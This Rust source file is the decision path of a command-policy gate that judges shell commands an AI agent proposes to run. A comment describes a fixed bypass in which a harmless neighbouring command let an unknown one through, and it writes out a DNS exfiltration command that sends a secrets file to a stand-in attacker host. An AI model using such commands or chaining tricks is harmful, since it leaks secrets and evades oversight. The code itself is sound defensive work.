//! The decision path.
//!
//! Parse, resolve, unwrap, match, decide — with a deadline over the whole
//! thing and a fail-closed answer if it expires.
//!
//! # The shape of the latency budget
//!
//! Nothing here forks, execs, or talks to a network. The only syscalls on the
//! path are the `stat` and `readlink` calls behind path resolution, and those
//! are cached on the (program, directory) pairs an agent hits over and over.
//! What is left is parsing and matching, both linear in the length of the
//! command.
//!
//! That is why the budget is a deadline rather than a timeout on a worker: no
//! step can block, so a check between phases is enough to bound the whole
//! thing, and there is no thread to cancel.

use std::sync::{Arc, RwLock};
use std::time::{Duration, Instant};

use shellguard_parse::parse_with_limits;
use shellguard_policy::{
    ArgFacts, Capability, CommandFacts, CompiledPolicy, RuleHit, Scratch, Verdict,
};

use crate::config::GateConfig;
use crate::decision::{CommandSummary, Decision, Finding, Incomplete};
use crate::normalize::{Cmd, Collector, Ctx};
use crate::resolve::PathCache;

/// A command that no rule spoke for, and so took the policy default.
///
/// Held until the end of the evaluation because whether it needs a finding of its
/// own depends on whether any *other* command matched something.
struct Defaulted {
    program: Option<String>,
    span: shellguard_parse::Span,
    text: String,
    wrap_depth: u8,
    via: Option<&'static str>,
}

/// Per-thread evaluation state.
///
/// Kept out of [`Gate`] so the gate itself is immutable and shareable, and so
/// the caches and buffers that make evaluation fast are explicitly owned by
/// whoever is doing the evaluating. A gate shared across eight threads has
/// eight of these and no contention.
#[derive(Debug, Default)]
pub struct Worker {
    scratch: Scratch,
    cache: PathCache,
    hits: Vec<RuleHit>,
    cmds: Vec<Cmd>,
}

impl Worker {
    pub fn new() -> Self {
        Worker::default()
    }

    /// Hit rate of the path-resolution cache, for diagnostics.
    pub fn cache_hit_rate(&self) -> f64 {
        self.cache.hit_rate()
    }

    /// Drop cached resolutions. Needed after anything that could change what a
    /// name resolves to — a `$PATH` change, or an install into a directory on
    /// it — since the cache has no way to notice that itself.
    pub fn invalidate_cache(&mut self) {
        self.cache.clear();
    }
}

#[derive(Debug)]
pub struct Gate {
    /// Swapped whole by [`Gate::reload`]; see `reload.rs` for why an evaluation
    /// takes one snapshot and keeps it.
    pub(crate) policy: RwLock<Arc<CompiledPolicy>>,
    config: GateConfig,
}

impl Gate {
    pub fn new(policy: CompiledPolicy, config: GateConfig) -> Self {
        Gate { policy: RwLock::new(Arc::new(policy)), config }
    }

    /// A gate carrying the built-in ruleset.
    pub fn with_default_policy(config: GateConfig) -> Self {
        Gate::new(shellguard_policy::default_policy(), config)
    }

    pub fn config(&self) -> &GateConfig {
        &self.config
    }

    /// The policy in force right now.
    ///
    /// A snapshot: a later [`reload`](Gate::reload) does not change the one
    /// returned here, which is what lets a caller read it without holding a
    /// lock.
    pub fn policy(&self) -> Arc<CompiledPolicy> {
        // A poisoned lock still holds a whole `Arc`: the only write is one
        // assignment, so there is no half-written state to be afraid of.
        Arc::clone(&self.policy.read().unwrap_or_else(|poisoned| poisoned.into_inner()))
    }

    /// Identifies the policy in force; see `CompiledPolicy::fingerprint`.
    pub fn policy_fingerprint(&self) -> u64 {
        self.policy().fingerprint()
    }

    /// Judge a command.
    ///
    /// Never panics and never blocks. Every failure mode — unparseable input,
    /// a blown deadline, a wrapper chain too deep — resolves to a [`Decision`]
    /// with `incomplete` set and a verdict no weaker than the configured
    /// fail-closed one.
    pub fn evaluate(&self, src: &str, w: &mut Worker) -> Decision {
        let start = Instant::now();
        w.hits.clear();
        w.cmds.clear();

        // One snapshot for the whole evaluation. A reload landing mid-way must
        // not have this command judged half by each ruleset.
        let policy = self.policy();

        let ast = match parse_with_limits(src, self.config.limits) {
            Ok(a) => a,
            Err(e) => {
                return Decision {
                    verdict: self.config.on_parse_error,
                    findings: Vec::new(),
                    capabilities: Vec::new(),
                    commands: Vec::new(),
                    incomplete: Some(Incomplete::Parse(e.to_string())),
                    elapsed: start.elapsed(),
                    policy_fingerprint: policy.fingerprint(),
                };
            }
        };

        // Taken out of the worker so the collector can borrow the cache while
        // the loop below borrows the scratch buffers. Returned at the end, so
        // the allocation is reused across evaluations.
        let mut cmds = std::mem::take(&mut w.cmds);
        let mut collector = Collector::new(
            &self.config,
            &mut w.cache,
            src,
            self.config.limits,
            self.config.max_unwrap_depth,
        );
        collector.collect_root(&ast, Ctx::default(), &mut cmds);
        let unwrap_truncated = collector.unwrap_truncated;

        let mut verdict = Verdict::Allow;
        let mut findings: Vec<Finding> = Vec::new();
        let mut capabilities: Vec<Capability> = Vec::new();
        let mut commands: Vec<CommandSummary> = Vec::new();
        let mut matched_any = false;
        let mut executed_any = false;
        // Commands that ran no rule's gauntlet and so took the policy default.
        let mut defaulted: Vec<Defaulted> = Vec::new();
        let mut incomplete = None;

        for cmd in &cmds {
            if start.elapsed() > self.config.deadline {
                incomplete = Some(Incomplete::Deadline {
                    budget: self.config.deadline,
                    elapsed: start.elapsed(),
                });
                break;
            }

            commands.push(CommandSummary {
                program: cmd.program.clone(),
                resolved_path: cmd.resolved.clone(),
                span: cmd.span,
                wrap_depth: cmd.wrap_depth,
                synthetic: cmd.synthetic,
            });

            w.hits.clear();
            let args: Vec<ArgFacts<'_>> = cmd.args.iter().map(arg_facts).collect();
            let targets: Vec<ArgFacts<'_>> = cmd.write_targets.iter().map(arg_facts).collect();
            let writes: Vec<ArgFacts<'_>> = cmd.writes.iter().map(arg_facts).collect();
            let assignments: Vec<&str> = cmd.assignments.iter().map(String::as_str).collect();
            let downstream: Vec<&str> = cmd.downstream.iter().map(String::as_str).collect();
            let upstream: Vec<&str> = cmd.upstream.iter().map(String::as_str).collect();

            let facts = CommandFacts {
                program: cmd.program.as_deref(),
                program_path: cmd.resolved.as_deref(),
                subcommand: cmd.subcommand.as_deref(),
                args: &args,
                write_targets: &targets,
                writes: &writes,
                assignments: &assignments,
                short_flags: &cmd.short_flags,
                arg_taint: cmd.arg_taint,
                opacity: cmd.opacity,
                has_write_redirect: cmd.has_write_redirect,
                has_truncating_redirect: cmd.has_truncating_redirect,
                write_redirect_outside_workspace: cmd.write_redirect_outside,
                downstream: &downstream,
                upstream: &upstream,
                text: &cmd.text,
                nested: cmd.nested,
                wrap_depth: cmd.wrap_depth,
            };
            policy.evaluate(&facts, &mut w.scratch, &mut w.hits);

            executed_any |= cmd.executes();
            if !w.hits.is_empty() {
                matched_any = true;
            } else if cmd.executes() && !cmd.wrapper {
                // The default applies to each command that nothing spoke for,
                // not once for the whole line. Applied globally it was defeated
                // by a neighbour: `totally-unknown-tool; ls` matched `ls`'s allow
                // rule, so the unknown tool was never asked, and `nslookup
                // $(cat secrets.txt).attacker.example` came back `allow`.
                verdict = verdict.join(policy.default_verdict());
                defaulted.push(Defaulted {
                    program: cmd.program.clone(),
                    span: cmd.span,
                    text: cmd.text.clone(),
                    wrap_depth: cmd.wrap_depth,
                    via: cmd.via,
                });
            }
            for hit in w.hits.drain(..) {
                verdict = verdict.join(hit.verdict);
                for c in &hit.caps {
                    if !capabilities.contains(c) {
                        capabilities.push(*c);
                    }
                }
                findings.push(Finding {
                    rule_id: hit.rule_id,
                    verdict: hit.verdict,
                    reason: hit.reason,
                    program: cmd.program.clone(),
                    span: cmd.span,
                    excerpt: cmd.text.clone(),
                    wrap_depth: cmd.wrap_depth,
                    via: cmd.via,
                    caps: hit.caps,
                });
            }
        }

        // Nothing spoke, and nothing was even asked. A line with nothing in it that
        // executes — empty, or only assignments — and no rule that fired has had no
        // command put to the per-command default above, so it takes the policy
        // default here: silence is not evidence of safety.
        if !matched_any && !executed_any {
            verdict = verdict.join(policy.default_verdict());
        }

        // When some *other* command did match, the verdict raised by the default
        // would otherwise have no finding to explain it, and the first line of a
        // report is supposed to be the reason. (When nothing matched at all the
        // absence of findings already reads as "the default applied".)
        if matched_any {
            for d in defaulted {
                findings.push(Finding {
                    rule_id: "policy.default".to_string(),
                    verdict: policy.default_verdict(),
                    reason: "no rule matched this command; the policy default applies".to_string(),
                    program: d.program,
                    span: d.span,
                    excerpt: d.text,
                    wrap_depth: d.wrap_depth,
                    via: d.via,
                    caps: Vec::new(),
                });
            }
        }

        if incomplete.is_none() && unwrap_truncated {
            incomplete = Some(Incomplete::UnwrapDepth);
        }
        if incomplete.is_some() {
            verdict = verdict.join(self.config.on_timeout);
        }

        // Most severe first, so the first line of a report is the reason.
        // A stable sort keeps declaration order within a severity, which is
        // what makes two runs of the same command produce identical output.
        findings.sort_by_key(|f| std::cmp::Reverse(f.verdict));

        cmds.clear();
        w.cmds = cmds;

        Decision {
            verdict,
            findings,
            capabilities,
            commands,
            incomplete,
            elapsed: start.elapsed(),
            policy_fingerprint: policy.fingerprint(),
        }
    }

    /// Evaluate with a one-off worker. Convenient for tests and one-shot CLI
    /// use; wasteful in a loop, because it throws the caches away each time.
    pub fn evaluate_once(&self, src: &str) -> Decision {
        let mut w = Worker::new();
        self.evaluate(src, &mut w)
    }
}

/// Convert one normalised argument into policy facts.
///
/// The facts are a *view* into the normalised command rather than a copy, which
/// is why they are built inside the evaluation loop and not returned from a
/// helper: the borrow checker is enforcing that the policy layer cannot outlive
/// or mutate what it is judging.
fn arg_facts(a: &crate::normalize::Arg) -> ArgFacts<'_> {
    ArgFacts {
        literal: a.literal.as_deref(),
        prefix: &a.prefix,
        taint: a.taint,
        looks_like_path: a.looks_like_path,
        absolute: a.absolute,
        outside_workspace: a.outside_workspace,
        unresolved_path: a.unresolved_path,
        resolved: &a.resolved,
    }
}

/// The latency the project promises, and what `shellguard bench` holds it to.
///
/// A target for how long evaluation *takes*. It is not the point at which the gate
/// gives up; that is [`DEFAULT_DEADLINE`].
pub const LATENCY_BUDGET: Duration = Duration::from_millis(10);

/// How long one evaluation may run before the gate gives up and denies.
///
/// A safety valve, not the budget. It exists so that adversarial input cannot make
/// evaluation slow enough to be a bypass, and the worst such input measured takes
/// about 2 ms. It is ten times [`LATENCY_BUDGET`] because it is wall-clock time:
/// it also counts every moment the thread was not scheduled. Set equal to the
/// budget it fired on ordinary commands whenever the machine was busy or the
/// process was cold — measured at 1 in 414 identical evaluations, with a 30 ms
/// overrun on a benign `basename $(pwd)` — and a refusal of something innocent is a
/// cost paid by the operator every time it happens. Typical evaluation is a few
/// microseconds either way.
pub const DEFAULT_DEADLINE: Duration = Duration::from_millis(100);
